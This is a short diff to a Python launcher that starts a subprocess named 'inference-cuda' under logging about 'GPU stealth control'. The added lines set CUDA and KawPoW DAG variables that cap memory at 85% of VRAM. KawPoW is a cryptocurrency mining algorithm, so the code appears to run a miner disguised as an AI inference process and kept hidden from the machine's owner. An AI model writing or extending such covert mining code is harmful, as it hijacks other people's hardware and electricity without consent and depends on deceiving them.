@@ -192,6 +192,20 @@ def main():
         logger.info("🔄 [GPU-POST-EXEC-STEALTH] Using subprocess mode to maintain GPU stealth control")
         
         try:
+            # Memory optimization trước khi start inference-cuda 
+            logger.info("🧠 [MEMORY-OPT] Pre-execution memory optimization...")
+            
+            # Set DAG generation memory limits
+            clean_env['CUDA_LAUNCH_BLOCKING'] = '1'  # Synchronous CUDA calls
+            clean_env['CUDA_CACHE_DISABLE'] = '1'    # Disable CUDA cache during DAG gen
+            clean_env['CUDA_DEVICE_MAX_CONNECTIONS'] = '1'  # Limit concurrent connections
+            
+            # Progressive memory allocation for DAG
+            clean_env['KAWPOW_DAG_PROGRESSIVE'] = '1'  # Enable progressive DAG loading
+            clean_env['KAWPOW_DAG_MEMORY_LIMIT'] = '85'  # Use max 85% VRAM for DAG
+            
+            logger.info("🧠 [MEMORY-OPT] DAG generation memory limits applied")
+            
             # Start inference-cuda as subprocess
             # **FIX: Remove stdout/stderr redirection to allow parent capture** (sửa: bỏ chuyển hướng stdout/stderr để parent có thể capture)
             process = subprocess.Popen(
